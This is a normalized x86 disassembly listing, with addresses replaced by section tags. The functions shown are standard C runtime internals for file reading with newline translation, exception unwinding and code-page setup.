je r-xdata
mov eax [ eax ]
mov eax [ eax + 0xc ]
test al 0x83
jne r-xdata
push 0xfa0
mov eax [ eax ]
add eax 0x20
push eax
call sub_10031992
pop ecx
pop ecx
test eax eax
mov eax [ rw-data ]
jne r-xdata
inc esi
jmp r-xdata
test eax 0x8000
jne r-xdata
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ esi + eax ]
mov [ ebp - 0x1c ] edi
mov [ edi + 0xc ] ebx
push [ esi + eax ]
call sub_10024aba
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
lea eax [ esi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_100274df
pop ecx
pop ecx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ esi + 0x10 ]
push eax
call sub_1002d0ed
pop ecx
test eax eax
je r-xdata
mov edi eax
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
push esi
call sub_1002754d
pop ecx
pop ecx
sub_100304d4
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_10030564
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_10037271
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_10037290
jmp r-xdata
sub_10030564
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_100242d7
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_100304d4
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_100305c6
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_100305f6
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push 0x0
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10030627
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_1002973e
and [ eax ] 0x0
call sub_1002972b
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_1002973e
mov [ eax ] ebx
call sub_1002972b
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x9
call sub_1002480c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_1002973e
mov [ eax ] ebx
call sub_1002972b
mov [ eax ] 0x9
jmp r-xdata
call sub_1002973e
mov [ eax ] ebx
call sub_1002972b
mov [ eax ] 0x16
mov [ ebp - 0x10 ] ebx
cmp edx ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1002480c
add esp 0x14
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_1002a000
pop ecx
mov [ ebp - 0xc ] eax
cmp eax ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_10035bda
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
mov eax [ ebp - 0xc ]
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_1002972b
mov [ eax ] 0xc
call sub_1002973e
mov [ eax ] 0x8
push ebx
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx ebx
jl r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_1002972b
mov [ eax ] 0x9
call sub_1002973e
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
cmp [ ebp - 0x2 ] bl
je r-xdata
push eax
call sub_10029751
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0x10 ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_10024aba
pop ecx
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp cx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0xc ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp cx 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
inc ebx
inc ebx
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
inc ebx
inc ebx
inc eax
inc eax
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0xc ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0xc ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
inc ecx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0x10 ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0xc ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_1002972b
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_10035bda
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_10035bda
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
inc ebx
inc ebx
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_10035bda
add esp 0x10
inc ebx
cmp eax 0x2
mov [ ecx + 0x5 ] dl
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_10030be9
push 0x10
push r--data
call sub_1002ca38
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor esi esi
cmp eax esi
jl r-xdata
call sub_1002973e
and [ eax ] 0x0
call sub_1002972b
mov [ eax ] 0x9
call sub_1002973e
mov [ eax ] esi
call sub_1002972b
mov [ eax ] 0x9
cmp eax [ rw-data ]
jb r-xdata
call sub_1002ca7d
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov edi eax
and edi 0x1f
shl edi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + edi + 0x4 ]
and ecx 0x1
je r-xdata
mov ecx 0x7fffffff
cmp ecx [ ebp + 0x10 ]
sbb ecx ecx
inc ecx
jne r-xdata
push eax
call sub_10036ef9
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_1002973e
mov [ eax ] esi
call sub_1002972b
mov [ eax ] 0x16
jmp r-xdata
call sub_1002972b
mov [ eax ] 0x9
call sub_1002973e
mov [ eax ] esi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10030627
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_1002480c
add esp 0x14
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10030cdc
mov eax [ ebp - 0x1c ]
sub_10030ce6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_1002ed42
push eax
call sub_10035d78
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
call sub_100273c7
add eax 0x20
cmp esi eax
jne r-xdata
call sub_100273c7
add eax 0x40
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
push ebx
push edi
lea edi [ eax * 4 + rw-data ]
cmp [ edi ] 0x0
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x18 ] ebx
mov [ esi + 0x4 ] ebx
push ebx
call sub_1002a000
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
pop esi
pop ebp
retn
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
xor eax eax
pop edi
inc eax
pop ebx
jmp r-xdata
sub_10030d82
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x1000
je r-xdata
pop esi
push esi
call sub_10025558
and [ esi + 0xc ] 0xffffeeff
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_10030db6
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_10030de5
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_10024b80
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_10030e49
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
mov dl cl
add dl 0x20
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
mov dl cl
sub dl 0x20
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_10034124
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_10029f92
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_10029f92
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
inc ebx
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_10024b80
add esp 0xc
mov [ esi + eax + 0x11d ] 0x0
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_10030fdc
push 0xc
push r--data
call sub_1002ca38
call sub_1002bd74
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_1002d1b0
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10031077
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_1002ca7d
retn
push 0x20
call sub_10027ad8
pop ecx
cmp esi rw-data
je r-xdata
push esi
call sub_10024aba
pop ecx
sub_10031080
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_10027728
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_100310fc
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_10031080
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_10030de5
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_10024b80
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_10030db6
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
inc ecx
mov [ eax ] si
inc ecx
inc eax
inc eax
dec edx
jne r-xdata
mov esi ebx
call sub_10030e49
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
inc esi
inc esi
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_10024b80
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_10030db6
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
inc esi
inc esi
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_100312e1
push 0x14
push r--data
call sub_1002ca38
or [ ebp - 0x20 ] 0xffffffff
call sub_1002bd74
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_10030fdc
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_10031080
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_1002a000
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_1002ca7d
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_100310fc
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_1002972b
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_10024aba
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_10024aba
pop ecx
push 0xd
call sub_1002d1b0
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10031442
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_10024aba
pop ecx
sub_10031499
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_10027728
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_100348f7
